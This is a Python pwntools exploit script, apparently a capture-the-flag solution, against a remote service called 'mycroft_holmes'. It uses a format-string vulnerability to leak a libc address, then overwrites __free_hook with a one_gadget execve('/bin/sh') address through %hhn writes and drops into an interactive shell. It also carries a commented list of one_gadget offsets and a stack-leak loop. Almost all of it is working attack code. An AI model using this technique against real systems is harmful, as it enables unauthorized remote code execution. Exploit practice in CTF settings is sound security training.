from pwn import *

#context.log_level = "debug"
HOST = "178.62.249.106"
PORT = 14273
#for i in range(1, 1000):
#    print(i)
#    #conn = remote(HOST, PORT)
#    conn = process("./mycroft_holmes")
#    conn.sendline("s")
#    conn.recv()
#    conn.sendline("help " + "a" * 8 + "%%%d$llx" % i)
#    conn.send("\n")
#    conn.recvuntil("a" * 8)
#    print(conn.recvuntil(">>>")[:-3])
#    conn.close()

conn = remote(HOST, PORT)
#conn = process("./mycroft_holmes")
#conn.sendline("s")
#conn.recv()
#conn.sendline("help " + "a" * 8 + "%16$llu")
#conn.send("\n")
#conn.recvuntil("a" * 8)
#STACK = int(conn.recvuntil(">>>")[:-3]) - 0x5 - 0x8 * 154
#log.success("STACK :0x%x" % STACK)
conn.sendline("s")
conn.recv()
conn.sendline("help " + "a" * 8 + "%193$llu")
conn.send("\n")
conn.recvuntil("a" * 8)
#0000000000020740 T __libc_start_main
#0x7f04a9144830 (<__libc_start_main+240>:
LIBC = int(conn.recvuntil(">>>")[:-3]) - 0x20740 - 240
log.success("LIBC :0x%x" % LIBC)
#0x4526a	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xcd0f3	execve("/bin/sh", rcx, r12)
#constraints:
#  [rcx] == NULL || rcx == NULL
#  [r12] == NULL || r12 == NULL
#
#0xcd1c8	execve("/bin/sh", rax, r12)
#constraints:
#  [rax] == NULL || rax == NULL
#  [r12] == NULL || r12 == NULL
#
#0xf0274	execve("/bin/sh", rsp+0x50, environ)
#constraints:
#  [rsp+0x50] == NULL
#
#0xf1117	execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
#
#0xf66c0	execve("/bin/sh", rcx, [rbp-0xf8])
#constraints:
#  [rcx] == NULL || rcx == NULL
#  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
one_gadget = p64(LIBC + 0x4526a)
count = 0
FREE_HOOK = LIBC + 0x3c67a8
log.success("FREE_HOOK :0x%x" % (FREE_HOOK))
for c in one_gadget:
    if ord(c) == 0:
        break
    print(hex(ord(c)))
    help_str = "help aaa"
    if (ord(c) - 3) <= 0:
        c = chr(0x100 - ord(c))
    write_str = "a" * (ord(c) - 3)
    payload = "%183$hhn"
    payload += "a" * ((183 - 159) * 8 - len(payload) - len(write_str))
    #00000000003c67a8 V __free_hook
    payload += p64(LIBC + 0x3c67a8 + count)
    conn.sendline(help_str + write_str + payload)
    count += 1
conn.interactive()
